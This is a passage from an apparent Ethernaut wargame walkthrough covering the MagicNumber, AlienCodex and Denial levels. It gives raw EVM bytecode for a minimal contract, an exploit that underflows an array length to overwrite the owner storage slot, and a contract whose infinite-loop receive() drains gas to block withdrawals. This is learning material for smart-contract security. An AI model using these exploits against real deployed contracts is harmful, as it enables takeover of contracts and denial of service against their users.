So first we store our 0x42 value in memory with mstore(p, v), where p is position and v is the value in hexadecimal:
6042    // v: push1 0x42 (value is 0x42)
6080    // p: push1 0x80 (memory slot is 0x80)
52      // mstore
2. Then, we can return this the 0x42 value:

6020    // s: push1 0x20 (value is 32 bytes in size)
6080    // p: push1 0x80 (value was stored in slot 0x80)
f3      // return
This resulting opcode sequence should be 604260805260206080f3. Our runtime opcode is exactly 10 opcodes and 10 bytes long.

Initialization Opcodes — Part 2
Creating the contract initialization opcodes. We need to know that these opcodes need to replicate our runtime opcodes to memory, before returning them to the EVM. Recall that the EVM will then automatically save the runtime sequence 604260805260206080f3 to the blockchain — we won’t have to handle this last part.

Copying code from one place to another is handled by the opcode `codecopy`, which takes in 3 arguments:

t: the destination position of the code, in memory. Let’s arbitrarily save the code to the 0x00 position.
f: the current position of the runtime opcodes, in reference to the entire bytecode. Remember that f starts after initialization opcodes end. This value is currently unknown to us.
s: size of the code, in bytes. Recall that 604260805260206080f3 is 10 bytes long (or 0x0a in hex).
3. First we copy our runtime opcodes into memory. Add a placeholder for f, as it is currently unknown:

600a    // s: push1 0x0a (10 bytes)
60??    // f: push1 0x?? (current position of runtime opcodes)
6000    // t: push1 0x00 (destination memory index 0)
39      // CODECOPY
4. Then, return your in-memory runtime opcodes to the EVM:

600a    // s: push1 0x0a (runtime opcode length)
6000    // p: push1 0x00 (access memory index 0)
f3      // return to EVM
5. Notice that in total, our initialization opcodes take up 12 bytes, or 0x0c spaces. This means our runtime opcodes will start at index 0x0c, where f is now known to be 0x0c:

600a    // s: push1 0x0a (10 bytes)
600c    // f: push1 0x?? (current position of runtime opcodes)
6000    // t: push1 0x00 (destination memory index 0)
39      // CODECOPY
6. The final sequence is thus:

0x600a600c600039600a6000f3604260805260206080f3
Where the first 12 bytes are initialization opcodes and the subsequent 10 bytes are your runtime opcodes.

So in our terminal we pass the final sequence as our bytecode to get the address needed to pass into`setSolver()`
```
> var bytecode = "0x600a600c600039600a6000f3604260805260206080f3";
> web3.eth.sendTransaction({ from: account, data: bytecode }, function(err,res){console.log(res)});
```
Finally, we simply input the following to pass the level:
```
await contract.setSolver("contract address");
```

Resources to try to check on:
Opcodes and bytecodes in solidity https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2

6 parts to destructuring a solidity contract https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/

S/O https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 and https://listed.to/@r1oga/13786/ethernaut-levels-16-to-18 for the detailed explanatikon on how to solve this level.



## 19. AlienCodex
In order to solve this level, we need to understand about 3 things:
1. Packing of storage variables to fit into one storage slot of 32bytes
2. How values in dynamic arrays are stored
3. How to modify an item outside of the size of the array.ss

The problem is hinting us to somehow use the codex array to change the owner of the contract. The tool in doing so probably has something to do with the length of array. In fact, the retract is suspiciously dangerous, and actually might underflow the array length!. The array length is an uint256, and once it is underflowed you basically "have" the entire contract storage (all 2 ^ 256 - 1 slots) as a part of your array. Consequently, you can index everything in the memory with that array!
-After make_contact, we see that await web3.eth.getStorageAt(contract.address, 0) returns 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272. Remember that smaller than 32-bytes variables are bundled together if they are conseuctive, so this is actually owner and contact variable side by side! The 01 at the end of leftmost 0x00..01 stands for the boolean value.
-The next slot, await web3.eth.getStorageAt(contract.address, 1) is the length of codex array. If you record something you will see that it gets incremented. Well, what if we retract? You will be shocked to see that it becomes 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff!
So then, how does indexing work and how can we index the owner slot now that our array covers the entire storage? We look at the docs of highest version 0.5.0 as that is what the puzzle uses: https://docs.soliditylang.org/en/v0.5.17/miscellaneous.html#mappings-and-dynamic-arrays.

The mapping or the dynamic array itself occupies a slot in storage at some position p according to the above rule (or by recursively applying this rule for mappings of mappings or arrays of arrays). For dynamic arrays, this slot stores the number of elements in the array. Array data is located at keccak256(p).

To see this in action, we can do:

```
await contract.record('0xffffffffffffffffffffffffffffffff')
await web3.eth.getStorageAt(contract.address , web3.utils.hexToNumberString(web3.utils.soliditySha3(1)))
// 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000
```
 first we have to retract until the array length underflows, and then we just have to offset enough from keccak256(1) until we overflow and get back to 0th index, overwriting the owner! The array data is located at uint256(keccak256(1)) and there are 2 ** 256 - 1 - uint256(keccak256(1)) values between that and the end of memory. So, just adding one more to that would mean we go to 0th index. To calculate this index I just wrote a small Solidity code in Remix:
```
function index() public pure returns(uint256) {
  return type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1; 
}
```
Then we call the revise function as follows:
```
await contract.codex('35707666377435648211887908874984608119992236509074197713628505308453184860938') // if you want to confirm
await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', web3.utils.padLeft(player, 64))
```
Check this location for deeper explanation on level "https://dev.to/erhant/ethernaut-19-alien-codex-3e49"



## 20. Denial
This level is very similar to the levels Force and King. The problem with the Denial contract is the fact that instead of transferring using `.send()` or `.transfer`() which has a limit of 2300 gas and the exploit has to do with call function: partner.call{value:amountToSend}(""), by using`.call()` if no limit on the gas is specified, it will send all gas along with it.  `assert(false)`  used to do the trick in the old versions but it no longer works due to a [breaking change](https://blog.soliditylang.org/2020/12/16/solidity-v0.8.0-release-announcement/) in solidity v0.8.0 so we need another way to expand all available gas. The simplest way to do this is to run a fallback function in an infinite loop.
```
pragma solidity ^0.8.0;

contract DenialAttack {
    receive() external payable {
        while(true){}
    }
}

await contract.setWithdrawPartner("<address of your deployed AttackDenial contract.>");
```
We then set the withdrawal partner as this contract address, and we are done.
